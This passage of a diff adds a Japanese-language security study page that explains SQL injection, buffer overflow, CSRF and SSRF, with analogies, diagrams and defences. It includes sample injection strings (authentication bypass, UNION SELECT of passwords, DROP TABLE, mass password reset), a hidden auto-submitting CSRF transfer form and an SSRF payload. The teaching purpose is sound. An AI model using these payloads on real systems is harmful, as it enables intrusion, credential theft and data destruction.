+              <div class="atk-line dashed warn atk-arrow-l warn"></div>
+              <div class="atk-label warn"><span class="atk-step-no warn">3</span>結果(全レコード)を返却</div>
+            </div>
+          </div>
+          <!-- 司書(DB) -->
+          <div class="atk-node">
+            <div class="atk-icon db">
+              <svg width="38" height="38" viewBox="-20 -20 40 40" stroke-linecap="round" stroke-linejoin="round">
+                <ellipse cx="0" cy="-13" rx="16" ry="4.5" fill="#ede8ff" stroke="#5a1a9e" stroke-width="1.4"/>
+                <path d="M -16 -13 L -16 13 Q -16 17.5 0 17.5 Q 16 17.5 16 13 L 16 -13" fill="#ede8ff" stroke="#5a1a9e" stroke-width="1.4"/>
+                <path d="M -16 -4 Q -16 0.5 0 0.5 Q 16 0.5 16 -4" fill="none" stroke="#5a1a9e" stroke-width="1.1"/>
+                <path d="M -16 5 Q -16 9.5 0 9.5 Q 16 9.5 16 5" fill="none" stroke="#5a1a9e" stroke-width="1.1"/>
+                <text x="0" y="-11" text-anchor="middle" font-size="6" fill="#5a1a9e" font-weight="700">DB</text>
+              </svg>
+            </div>
+            <div class="atk-role db">司書 (DB)<small>指示を忠実に実行</small></div>
+          </div>
+        </div>
+      </div>
+      <div class="atk-caption">Web アプリがユーザ入力をそのまま SQL 文に組み込むため、攻撃者の SQL 命令も一緒に DB で実行される</div>
+    </div>
+  </div>
+  <div class="detail-box mechanism">
+    <h4>認証バイパスの仕組み</h4>
+    <p>ログインSQL：<code>WHERE id='入力' AND pass='入力'</code><br>
+    攻撃入力：<code>admin'--</code><br>
+    結果SQL：<code>WHERE id='admin'--' AND pass='...'</code><br>
+    → <code>--</code>以降はコメントとなりパスワード確認が無効化！</p>
+  </div>
+</div>
+
+<h3>攻撃の種類と具体例</h3>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:12px 0">
+  <div style="background:#fff;border:1px solid var(--line);border-radius:8px;overflow:hidden">
+    <div style="background:var(--danger);padding:8px 12px;font-size:11px;font-weight:700;color:white">認証バイパス</div>
+    <div style="padding:10px 12px">
+      <div class="detail-code" style="margin:0">
+<span class="c">-- 通常のログインSQL</span>
+<span class="k">SELECT</span> <span class="v">* FROM users WHERE id='yamada' AND pass='pass123'</span>
+
+<span class="c">-- 攻撃：パスワード欄に ' OR '1'='1 を入力</span>
+<span class="k">SELECT</span> <span class="v">* FROM users WHERE id='yamada' AND pass='</span><span class="ng">' OR '1'='1</span><span class="v">'</span>
+<span class="c">-- 常に真になるため全ユーザにマッチ → 認証突破</span>
+
+<span class="c">-- 攻撃：IDに admin'-- を入力</span>
+<span class="k">SELECT</span> <span class="v">* FROM users WHERE id='admin'</span><span class="ng">--</span><span class="v">' AND pass='...'</span>
+<span class="c">-- -- 以降がコメント化 → パスワード確認をスキップ</span>
+      </div>
+    </div>
+  </div>
+  <div style="background:#fff;border:1px solid var(--line);border-radius:8px;overflow:hidden">
+    <div style="background:var(--danger);padding:8px 12px;font-size:11px;font-weight:700;color:white">UNION SELECT（情報窃取）</div>
+    <div style="padding:10px 12px">
+      <div class="detail-code" style="margin:0">
+<span class="c">-- 通常のURLパラメータ</span>
+<span class="v">?category=1</span>
+
+<span class="c">-- 攻撃：UNION SELECTで別テーブルを参照</span>
+<span class="v">?category=1 </span><span class="ng">UNION SELECT username,password,NULL FROM users--</span>
+
+<span class="c">-- 生成されるSQL</span>
+<span class="k">SELECT</span> <span class="v">name,price,desc FROM products WHERE cat=1</span>
+<span class="ng">UNION SELECT username,password,NULL FROM users--</span>
+<span class="c">-- 商品一覧の中にユーザ名・パスワードが混入して表示！</span>
+      </div>
+    </div>
+  </div>
+  <div style="background:#fff;border:1px solid var(--line);border-radius:8px;overflow:hidden">
+    <div style="background:var(--danger);padding:8px 12px;font-size:11px;font-weight:700;color:white">ブラインドSQLi（エラー非表示時）</div>
+    <div style="padding:10px 12px">
+      <div class="detail-code" style="margin:0">
+<span class="c">-- エラーが画面に出なくても..．真偽で差異を確認</span>
+<span class="v">?id=1 </span><span class="ng">AND 1=1</span> <span class="c">-- 正常表示（真）</span>
+<span class="v">?id=1 </span><span class="ng">AND 1=2</span> <span class="c">-- 空ページ（偽）</span>
+
+<span class="c">-- パスワードの1文字目を推測</span>
+<span class="v">?id=1 </span><span class="ng">AND SUBSTRING(password,1,1)='a'</span>
+<span class="c">-- 表示差分から1文字ずつ割り出す</span>
+      </div>
+    </div>
+  </div>
+  <div style="background:#fff;border:1px solid var(--line);border-radius:8px;overflow:hidden">
+    <div style="background:var(--danger);padding:8px 12px;font-size:11px;font-weight:700;color:white">データ破壊</div>
+    <div style="padding:10px 12px">
+      <div class="detail-code" style="margin:0">
+<span class="c">-- 注文IDに注入してDB破壊</span>
+<span class="v">?order_id=1; </span><span class="ng">DROP TABLE orders; DROP TABLE users;--</span>
+
+<span class="c">-- 全ユーザのパスワードをリセット</span>
+<span class="v">?id=1; </span><span class="ng">UPDATE users SET password='hacked' WHERE 1=1;--</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<h3>対策</h3>
+<div class="steps">
+  <div class="step ok"><span class="sn" style="font-size:8px;width:48px;border-radius:3px;text-align:center">プリペアド</span>
+    <div class="sb"><strong>プリペアドステートメント（根本対策）：</strong>SQL文の構造をデータと完全に分離。<code>?</code>プレースホルダに値をバインドするためSQLとして解釈されない。
+    <div class="detail-code" style="margin:6px 0 0">
+<span class="c">// Java（JDBC）</span>
+<span class="ok">PreparedStatement</span> <span class="v">stmt = conn.prepareStatement("SELECT * FROM users WHERE id=?");</span>
+<span class="v">stmt.setString(1, userId);</span>
+
+<span class="c">// Python（SQLAlchemy）</span>
+<span class="ok">db.execute</span>(<span class="v">"SELECT * FROM users WHERE id=:id", {"id": user_id}</span>)
+
+<span class="c">// PHP（PDO）</span>
+<span class="ok">$stmt = $pdo->prepare</span>(<span class="v">"SELECT * FROM users WHERE id=?"</span>);
+<span class="v">$stmt->execute([$userId]);</span>
+    </div></div>
+  </div>
+  <div class="step ok"><span class="sn" style="font-size:8px;width:48px;border-radius:3px;text-align:center">最小権限</span>
+    <div class="sb"><strong>DBアカウントの最小権限化：</strong>Webアプリ用アカウントにはSELECTのみ付与。DROPやUPDATEの権限を与えない。攻撃が成功しても被害を最小化できる。</div>
+  </div>
+</div>
+</section>
+
+<!-- ================================================================ S04 BOF ================================================================ -->
+<section class="section" id="s4">
+<div class="section-header"><span class="s-num red-bg">04</span><h2>バッファオーバーフロー</h2></div>
+<p>バッファオーバーフロー（BOF）はプログラムが確保したメモリ領域を超えたデータを書き込み、<strong>隣接するリターンアドレスを上書き</strong>して任意コードを実行させる攻撃。C/C++で多発。</p>
+
+<div class="detail-grid" style="padding:0;gap:14px">
+  <div class="detail-box analogy">
+    <h4>たとえ話</h4>
+    <p>机の上に「100mlのコップ（バッファ）」が置かれ、隣に「次の仕事の指示書（リターンアドレス）」がある。通常は100ml以下を注ぐが、攻撃者が200ml注ぐと溢れた水がメモを濡らし内容を書き換える。<b>書き換えられた指示書に「金庫を全開にして逃げろ」</b>と書けば任意命令が実行される。</p>
+    <!-- BOF イラスト: コップ溢れ→指示書上書き -->
+    <div class="atk-scene">
+      <div class="atk-scene-inner">
+        <div class="atk-lane">
+          <!-- 攻撃者 -->
+          <div class="atk-node">
+            <div class="atk-icon attacker">
+              <svg width="38" height="38" viewBox="-16 -20 32 38" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M -14 14 L 14 14 L 13 17 L -13 17 Z" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                <rect x="-12" y="5" width="24" height="9" rx="1" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                <text x="0" y="12" text-anchor="middle" font-size="6" fill="#7a1818" font-family="monospace">&lt;/&gt;</text>
+                <path d="M -10 5 Q -12 -1 -4 -2 L 4 -2 Q 12 -1 10 5" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                <circle cx="0" cy="-9" r="7" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                <path d="M -5 -14 L -6 -20 Q -3 -17 -3 -15 Z" fill="#7a1818"/>
+                <path d="M 5 -14 L 6 -20 Q 3 -17 3 -15 Z" fill="#7a1818"/>
+                <rect x="-6" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                <rect x="1.5" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                <line x1="-1.5" y1="-9.7" x2="1.5" y2="-9.7" stroke="#7a1818" stroke-width="0.9"/>
+                <path d="M -3 -6 Q 0 -4 3 -6" fill="none" stroke="#7a1818" stroke-width="1.1"/>
+                <path d="M -1.5 -6 L -1 -4.5 L -0.5 -6 Z" fill="#7a1818"/>
+                <path d="M 0.5 -6 L 1 -4.5 L 1.5 -6 Z" fill="#7a1818"/>
+              </svg>
+            </div>
+            <div class="atk-role attacker">攻撃者</div>
+          </div>
+          <!-- 矢印: 大量入力 -->
+          <div class="atk-arrowcol">
+            <div class="atk-arrow-pair">
+              <div class="atk-label danger"><span class="atk-step-no danger">1</span>容量超過のデータ送信</div>
+              <div class="atk-payload danger">200 バイト (バッファは 100)</div>
+              <div class="atk-line danger atk-arrow-r danger"></div>
+            </div>
+          </div>
+          <!-- メモリレイアウト -->
+          <div class="atk-memory">
+            <div class="atk-mem-title">スタックメモリレイアウト</div>
+            <div class="atk-mem-row">
+              <div class="atk-mem-cell buffer">
+                <div class="atk-mem-cell-name">Buffer [100]</div>
+                <div class="atk-mem-cell-sub">input をコピー</div>
+              </div>
+              <div class="atk-mem-spill">»</div>
+              <div class="atk-mem-cell retaddr">
+                <div class="atk-mem-cell-name">Return Address</div>
+                <div class="atk-mem-cell-sub">→ シェルコードへ</div>
+              </div>
+            </div>
+            <div class="atk-mem-note">隣接配置 → バッファ溢れで上書きされる <span class="atk-excl" title="境界チェックなし">!</span></div>
+          </div>
+        </div>
+        <!-- 結果: 制御奪取 -->
+        <div class="atk-note danger" style="margin-top:14px">
+          <span class="atk-step-no danger" style="margin-top:1px">2</span>
+          <div><strong>制御フロー奪取：</strong>関数から戻る際、改ざん済みの Return Address が参照され、攻撃者が仕込んだコードにジャンプ → <strong>任意コード実行</strong>。</div>
+        </div>
+      </div>
+      <div class="atk-caption">バッファの容量超過データが隣接する Return Address を上書きし、プログラムの戻り先を乗っ取る</div>
+    </div>
+  </div>
+  <div class="detail-box mechanism">
+    <h4>スタック上の変化</h4>
+    <p>スタック（高アドレス側から）：<br>
+    <code>[リターンアドレス]</code> ← ここを上書き！<br>
+    <code>[フレームポインタEBP]</code><br>
+    <code>[バッファ 16bytes] AAAA...AAA</code><br><br>
+    16bytes確保のバッファに32bytes書き込むと、<b>リターンアドレスがシェルコードのアドレスに書き換えられ、関数リターン時に任意コードが実行</b>される。</p>
+  </div>
+</div>
+
+<h3>スタックの変化（正常 vs 攻撃時）</h3>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:12px 0">
+  <div style="background:#fff;border:1px solid var(--line);border-radius:8px;overflow:hidden">
+    <div style="background:var(--success);padding:8px 12px;font-size:11px;font-weight:700;color:white;display:flex;align-items:center;gap:5px">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+      正常（バッファ内に収まる）
+    </div>
+    <div style="padding:10px 12px;font-family:var(--mono);font-size:10.5px">
+      <div style="display:flex;flex-direction:column;gap:2px">
+        <div style="background:#3a3d52;color:white;padding:6px 10px;border-radius:4px 4px 0 0;text-align:center;font-size:10px">高アドレス</div>
+        <div style="background:#eaf3ff;border:1.5px solid var(--accent2);padding:7px 10px;text-align:center;color:var(--accent2);font-size:10px">リターンアドレス: 0x004010f0<br><span style="font-size:9px;color:#888;font-weight:400">正常な呼び出し元</span></div>
+        <div style="background:#eaf3ff;border:1.5px solid var(--accent2);border-top:none;padding:7px 10px;text-align:center;font-size:10px;color:var(--accent2)">EBP（フレームポインタ）</div>
+        <div style="background:#d0f0e0;border:1.5px solid var(--success);border-top:none;padding:7px 10px;text-align:center;color:var(--success);font-size:10px">バッファ [16bytes]<br><span style="font-size:9px">"Hello" = 5bytes のみ使用</span></div>
+        <div style="background:#3a3d52;color:white;padding:6px 10px;border-radius:0 0 4px 4px;text-align:center;font-size:10px">低アドレス</div>
+      </div>
+      <div style="margin-top:8px;background:#eaf7f1;border-radius:5px;padding:6px 10px;font-size:9.5px;color:var(--success);font-family:var(--sans)">リターンアドレス無事 → 正常に関数から戻る</div>
+    </div>
+  </div>
+  <div style="background:#fff;border:1px solid var(--line);border-radius:8px;overflow:hidden">
+    <div style="background:var(--danger);padding:8px 12px;font-size:11px;font-weight:700;color:white;display:flex;align-items:center;gap:5px">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+      攻撃時（32bytesを書き込み）
+    </div>
+    <div style="padding:10px 12px;font-family:var(--mono);font-size:10.5px">
+      <div style="display:flex;flex-direction:column;gap:2px">
+        <div style="background:#3a3d52;color:white;padding:6px 10px;border-radius:4px 4px 0 0;text-align:center;font-size:10px">高アドレス</div>
+        <div style="background:#fde8e8;border:2px solid var(--danger);padding:7px 10px;text-align:center;color:var(--danger);font-size:10px">リターンアドレス: 0xdeadbeef<br><span style="font-size:9px;font-weight:400">← シェルコードアドレスに書換！</span></div>
+        <div style="background:#fdf0f0;border:1.5px solid var(--danger);border-top:none;padding:7px 10px;text-align:center;font-size:10px;color:var(--danger)">EBP → 上書き済み</div>
+        <div style="background:#fde8e8;border:1.5px solid var(--danger);border-top:none;padding:7px 10px;text-align:center;color:var(--danger);font-size:10px">AAAA...（16bytes）+ シェルコード<br><span style="font-size:9px">バッファ超えて上書き中！</span></div>
+        <div style="background:#3a3d52;color:white;padding:6px 10px;border-radius:0 0 4px 4px;text-align:center;font-size:10px">低アドレス</div>
+      </div>
+      <div style="margin-top:8px;background:#fde8e8;border-radius:5px;padding:6px 10px;font-size:9.5px;color:var(--danger);font-family:var(--sans)">関数リターン時にシェルコード実行 → サーバ制御奪取</div>
+    </div>
+  </div>
+</div>
+
+<h3>対策（4本柱）</h3>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:10px 0">
+  <div style="background:#eaf7f1;border:1px solid #70c898;border-radius:8px;padding:12px">
+    <div style="font-size:11px;font-weight:700;color:var(--success);margin-bottom:6px">ASLR（アドレスランダム化）</div>
+    <div style="font-size:11.5px;color:#3a3d52;line-height:1.6">スタック・ヒープ・ライブラリのアドレスを毎回ランダム化。攻撃者はシェルコードの正確なアドレスを予測できなくなる。OSレベルの保護。</div>
+  </div>
+  <div style="background:#eaf7f1;border:1px solid #70c898;border-radius:8px;padding:12px">
+    <div style="font-size:11px;font-weight:700;color:var(--success);margin-bottom:6px">DEP/NX（実行不可ビット）</div>
+    <div style="font-size:11.5px;color:#3a3d52;line-height:1.6">スタック・ヒープをデータ領域として実行不可に設定。シェルコードを書き込んでも実行できなくなる。ハードウェア（CPU）とOS双方で対応。</div>
+  </div>
+  <div style="background:#eaf7f1;border:1px solid #70c898;border-radius:8px;padding:12px">
+    <div style="font-size:11px;font-weight:700;color:var(--success);margin-bottom:6px">スタックカナリア（番犬値）</div>
+    <div style="font-size:11.5px;color:#3a3d52;line-height:1.6">バッファとリターンアドレスの間にランダムなカナリア値を配置。関数リターン前に値が書き換えられていないか確認。コンパイラオプション（<code>-fstack-protector</code>）で自動挿入。</div>
+  </div>
+  <div style="background:#eaf7f1;border:1px solid #70c898;border-radius:8px;padding:12px">
+    <div style="font-size:11px;font-weight:700;color:var(--success);margin-bottom:6px">安全なAPIの使用</div>
+    <div style="font-size:11.5px;color:#3a3d52;line-height:1.6">危険：<code>gets()</code>・<code>strcpy()</code>・<code>sprintf()</code><br>安全：<code>fgets(n)</code>・<code>strncpy(n)</code>・<code>snprintf(n)</code><br>長さ引数<code>n</code>で書き込みを制限。</div>
+  </div>
+</div>
+</section>
+
+<!-- ================================================================ S05 CSRF ================================================================ -->
+<section class="section" id="s5">
+<div class="section-header"><span class="s-num red-bg">05</span><h2>CSRF — クロスサイトリクエストフォージェリ</h2></div>
+<p>ログイン中のユーザを騙して<strong>意図しないリクエストを正規サービスに送信</strong>させる攻撃。ユーザが認証済みのためサーバは正規リクエストと判断してしまう。</p>
+
+<div class="detail-grid" style="padding:0;gap:14px">
+  <div class="detail-box analogy">
+    <h4>たとえ話</h4>
+    <p>ネットバンクにログイン中の人が別サイトを閲覧中。その別サイトに「今すぐチェック」という画像があり、そのURL（<code>src</code>）が銀行の送金APIになっている。ページを開いただけで<b>ブラウザが自動的にCookieつきで送金リクエストを送信</b>してしまう。</p>
+    <!-- CSRF イラスト: ログイン中のユーザ + 罠サイト + 自動リクエスト -->
+    <div class="atk-scene">
+      <div class="atk-scene-inner">
+        <div class="atk-lane">
+          <!-- 攻撃者 -->
+          <div class="atk-node">
+            <div class="atk-icon attacker">
+              <svg width="38" height="38" viewBox="-16 -20 32 38" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M -14 14 L 14 14 L 13 17 L -13 17 Z" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                <rect x="-12" y="5" width="24" height="9" rx="1" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                <text x="0" y="12" text-anchor="middle" font-size="6" fill="#7a1818" font-family="monospace">&lt;/&gt;</text>
+                <path d="M -10 5 Q -12 -1 -4 -2 L 4 -2 Q 12 -1 10 5" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                <circle cx="0" cy="-9" r="7" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                <path d="M -5 -14 L -6 -20 Q -3 -17 -3 -15 Z" fill="#7a1818"/>
+                <path d="M 5 -14 L 6 -20 Q 3 -17 3 -15 Z" fill="#7a1818"/>
+                <rect x="-6" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                <rect x="1.5" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                <line x1="-1.5" y1="-9.7" x2="1.5" y2="-9.7" stroke="#7a1818" stroke-width="0.9"/>
+                <path d="M -3 -6 Q 0 -4 3 -6" fill="none" stroke="#7a1818" stroke-width="1.1"/>
+                <path d="M -1.5 -6 L -1 -4.5 L -0.5 -6 Z" fill="#7a1818"/>
+                <path d="M 0.5 -6 L 1 -4.5 L 1.5 -6 Z" fill="#7a1818"/>
+              </svg>
+            </div>
+            <div class="atk-role attacker">攻撃者</div>
+          </div>
+          <!-- ①罠誘導 -->
+          <div class="atk-arrowcol">
+            <div class="atk-arrow-pair">
+              <div class="atk-label danger"><span class="atk-step-no danger">1</span>罠サイトへ誘導</div>
+              <div class="atk-payload danger">&lt;img src="bank/transfer?to=evil"&gt;</div>
+              <div class="atk-line danger atk-arrow-r danger"></div>
+            </div>
+          </div>
+          <!-- 被害者(ログイン中) -->
+          <div class="atk-node">
+            <div class="atk-icon victim" style="position:relative">
+              <svg width="38" height="38" viewBox="-18 -15 36 36" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M -14 16 Q -15 2 -4 0 L 4 0 Q 15 2 14 16 Z" fill="#daeeff" stroke="#1a56cc" stroke-width="1.3"/>
+                <circle cx="0" cy="-8" r="8" fill="#daeeff" stroke="#1a56cc" stroke-width="1.3"/>
+              </svg>
+              <span style="position:absolute;top:-5px;right:-5px;background:#fff;border-radius:50%;width:22px;height:22px;display:flex;align-items:center;justify-content:center;border:1.5px solid #b5821e;box-shadow:0 1px 3px rgba(0,0,0,.15)" title="認証Cookie保持中">
+                <svg width="14" height="14" viewBox="-9 -9 18 18" stroke-linecap="round" stroke-linejoin="round">
+                  <circle cx="0" cy="0" r="7" fill="#f5c97a" stroke="#b5821e" stroke-width="1.2"/>
+                  <circle cx="-3" cy="-2" r="1.2" fill="#7a4208"/>
+                  <circle cx="3" cy="-3" r="1" fill="#7a4208"/>
+                  <circle cx="0" cy="2" r="1.2" fill="#7a4208"/>
+                  <circle cx="-2" cy="3" r="0.8" fill="#7a4208"/>
+                  <circle cx="3" cy="1" r="0.9" fill="#7a4208"/>
+                </svg>
+              </span>
+            </div>
+            <div class="atk-role victim">被害者<small>銀行ログイン中</small></div>
+          </div>
+          <!-- ②ブラウザが自動送信(Cookie付) -->
+          <div class="atk-arrowcol">
+            <div class="atk-arrow-pair">
+              <div class="atk-label warn"><span class="atk-step-no warn">2</span>ブラウザが自動送信 <span class="atk-excl" title="Cookie 自動添付">!</span></div>
+              <div class="atk-payload warn">POST /transfer + Cookie</div>
+              <div class="atk-line warn atk-arrow-r warn"></div>
+            </div>
+          </div>
+          <!-- 銀行サーバ -->
+          <div class="atk-node">
+            <div class="atk-icon server">
+              <svg width="38" height="38" viewBox="-20 -20 40 40" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="-17" y="-16" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                <rect x="-17" y="-4" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                <rect x="-17" y="8" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                <circle cx="-12" cy="-11" r="1.3" fill="#b5821e"/>
+                <circle cx="-12" cy="1" r="1.3" fill="#b5821e"/>
+                <circle cx="-12" cy="13" r="1.3" fill="#b5821e"/>
+                <line x1="-7" y1="-11" x2="13" y2="-11" stroke="#b5821e" stroke-width="1"/>
+                <line x1="-7" y1="1" x2="13" y2="1" stroke="#b5821e" stroke-width="1"/>
+                <line x1="-7" y1="13" x2="13" y2="13" stroke="#b5821e" stroke-width="1"/>
+              </svg>
+            </div>
+            <div class="atk-role server">銀行サーバ</div>
+          </div>
+        </div>
+        <div class="atk-note danger" style="margin-top:14px">
+          <span class="atk-step-no danger" style="margin-top:1px">3</span>
+          <div><strong>送金実行：</strong>Cookie が付いているため正規ユーザの意図的リクエストと誤認 → <strong>攻撃者口座へ送金</strong>。被害者は何も操作していないことすら気づかない。</div>
+        </div>
+      </div>
+      <div class="atk-caption">被害者が認証済みの状態で罠サイトを開くと、ブラウザが自動的に認証 Cookie 付きで銀行にリクエストを送る</div>
+    </div>
+  </div>
+  <div class="detail-box mechanism">
+    <h4>攻撃の仕組み</h4>
+    <p><strong>①</strong> ユーザが正規サービス（銀行）にログイン<br>
+    <strong>②</strong> 攻撃者の罠サイトにアクセス<br>
+    <strong>③</strong> 罠サイトのHTML（imgタグ等）が自動的にリクエストを送信<br>
+    <strong>④</strong> ブラウザがCookieを自動添付<br>
+    <strong>⑤</strong> 銀行サーバは正規ユーザのリクエストと判断 → 処理実行</p>
+  </div>
+</div>
+
+<h3>罠サイトのHTML例（攻撃の仕掛け方）</h3>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:12px 0">
+  <div>
+    <div style="font-size:10.5px;font-weight:700;color:var(--danger);margin-bottom:6px">GETリクエスト型（imgタグ）</div>
+    <div class="detail-code">
+<span class="c">&lt;!-- 罠サイトのHTML --&gt;</span>
+<span class="ng">&lt;img src="https://bank.jp/transfer?to=attacker&amp;amount=100000"
+     width="1" height="1"&gt;</span>
+<span class="c">&lt;!-- ページを開くだけで自動実行 --&gt;
+&lt;!-- 1x1ピクセルで見えない --&gt;</span>
+    </div>
+  </div>
+  <div>
+    <div style="font-size:10.5px;font-weight:700;color:var(--danger);margin-bottom:6px">POSTリクエスト型（自動送信フォーム）</div>
+    <div class="detail-code">
+<span class="ng">&lt;form action="https://bank.jp/transfer"
+      method="POST" id="f"&gt;
+  &lt;input type="hidden" name="to" value="attacker"&gt;
+  &lt;input type="hidden" name="amount" value="100000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit();&lt;/script&gt;</span>
+<span class="c">&lt;!-- ページロードと同時に送信 --&gt;</span>
+    </div>
+  </div>
+</div>
+
+<div class="note info">
+  <div style="flex-shrink:0;margin-top:2px"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1570b8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16" stroke-width="2.5"/></svg></div>
+  <p><strong>CSRF vs XSS の決定的な違い：</strong>XSSはブラウザで<strong>スクリプトを実行</strong>させる（攻撃者→ユーザのブラウザ）。CSRFはユーザのブラウザに<strong>リクエストを送信</strong>させる（ユーザのブラウザ→正規サーバ）。CSRFはスクリプト実行不要なため、imgタグ1行で発動できる。<br>
+  <strong>CSRF vs SSRF：</strong>CSRFはクライアント（ブラウザ）側から、SSRFはサーバ側からリクエストを発行させる。</p>
+</div>
+
+<h3>対策</h3>
+<div class="steps">
+  <div class="step ok"><span class="sn" style="font-size:8px;width:52px;border-radius:3px;text-align:center">CSRFトークン</span>
+    <div class="sb"><strong>CSRFトークン（最重要）：</strong>セッションごとにランダムなトークンをフォームに埋め込み、サーバがリクエスト時に検証。攻撃者はトークン値を知ることができないため偽リクエストを作れない。
+    <div class="detail-code" style="margin:6px 0 0">
+<span class="c">&lt;!-- フォームにトークンを埋め込む --&gt;</span>
+<span class="ok">&lt;input type="hidden" name="csrf_token" value="a8f3c72b..."&gt;</span>
+
+<span class="c">// サーバ側での検証</span>
+<span class="k">if</span> (<span class="v">$_POST['csrf_token'] !== $_SESSION['csrf_token']</span>) {
+  <span class="ng">die('CSRF攻撃を検知');</span>
+}
+    </div></div>
+  </div>
+  <div class="step ok"><span class="sn" style="font-size:8px;width:52px;border-radius:3px;text-align:center">SameSite</span>
+    <div class="sb"><strong>Cookie の SameSite 属性：</strong><code>SameSite=Strict</code>でクロスサイトリクエスト時のCookie送信をブロック。<code>SameSite=Lax</code>（多くのブラウザのデフォルト）はGETのトップレベルナビゲーションのみ許可。</div>
+  </div>
+</div>
+</section>
+
+<!-- ================================================================ S06 SSRF ================================================================ -->
+<section class="section" id="s6">
+<div class="section-header"><span class="s-num red-bg">06</span><h2>SSRF — サーバサイドリクエストフォージェリ</h2></div>
+<p>攻撃者がWebアプリに<strong>サーバ側から内部ネットワークへのリクエストを発行</strong>させる攻撃。FWで守られた内部システムへのアクセスが可能になる。クラウド環境では特に深刻。</p>
+
+<div class="detail-grid" style="padding:0;gap:14px">
+  <div class="detail-box analogy">
+    <h4>たとえ話</h4>
+    <p>銀行の入口には警備員（FW）がいて外部からの侵入を防ぐが、受付係（Webアプリ）は社内を自由に動ける。攻撃者が「この手紙を金庫室（内部サーバ）に届けて返事を持ってきて」と受付係に頼む。<b>受付係が業務として金庫室に行き内容を持ち帰る</b>ため、外部からは入れない場所の情報が取得される。</p>
+    <!-- SSRF イラスト: 警備員FW + 受付係(Webアプリ) + 金庫室 -->
+    <div class="atk-scene">
+      <div class="atk-scene-inner">
+        <div class="atk-lane">
+          <!-- 攻撃者 (外部) -->
+          <div class="atk-node">
+            <div class="atk-icon attacker">
+              <svg width="38" height="38" viewBox="-16 -20 32 38" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M -14 14 L 14 14 L 13 17 L -13 17 Z" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                <rect x="-12" y="5" width="24" height="9" rx="1" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                <text x="0" y="12" text-anchor="middle" font-size="6" fill="#7a1818" font-family="monospace">&lt;/&gt;</text>
+                <path d="M -10 5 Q -12 -1 -4 -2 L 4 -2 Q 12 -1 10 5" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                <circle cx="0" cy="-9" r="7" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                <path d="M -5 -14 L -6 -20 Q -3 -17 -3 -15 Z" fill="#7a1818"/>
+                <path d="M 5 -14 L 6 -20 Q 3 -17 3 -15 Z" fill="#7a1818"/>
+                <rect x="-6" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                <rect x="1.5" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                <line x1="-1.5" y1="-9.7" x2="1.5" y2="-9.7" stroke="#7a1818" stroke-width="0.9"/>
+                <path d="M -3 -6 Q 0 -4 3 -6" fill="none" stroke="#7a1818" stroke-width="1.1"/>
+                <path d="M -1.5 -6 L -1 -4.5 L -0.5 -6 Z" fill="#7a1818"/>
+                <path d="M 0.5 -6 L 1 -4.5 L 1.5 -6 Z" fill="#7a1818"/>
+              </svg>
+            </div>
+            <div class="atk-role attacker">攻撃者<small>(外部)</small></div>
+          </div>
+          <!-- ①依頼 -->
+          <div class="atk-arrowcol">
+            <div class="atk-arrow-pair">
+              <div class="atk-label danger"><span class="atk-step-no danger">1</span>内部URLを指定して依頼</div>
+              <div class="atk-payload danger">url=http://localhost/admin</div>
+              <div class="atk-line danger atk-arrow-r danger"></div>
+            </div>
+            <div class="atk-arrow-pair">
+              <div class="atk-line dashed danger atk-arrow-l danger"></div>
+              <div class="atk-label danger"><span class="atk-step-no danger">4</span>内部情報を攻撃者に返送</div>
+            </div>
+          </div>
+          <!-- Webアプリ (境界外)は廃して、FW + 内部ゾーン構造にする -->
+          <!-- 内部ネットワーク ゾーン -->
+          <div style="flex:3;display:flex;background:#f5f0ff;border:1.5px dashed #b090e0;border-radius:8px;padding:8px 8px 8px 14px;position:relative;gap:0;align-items:stretch;min-width:320px">
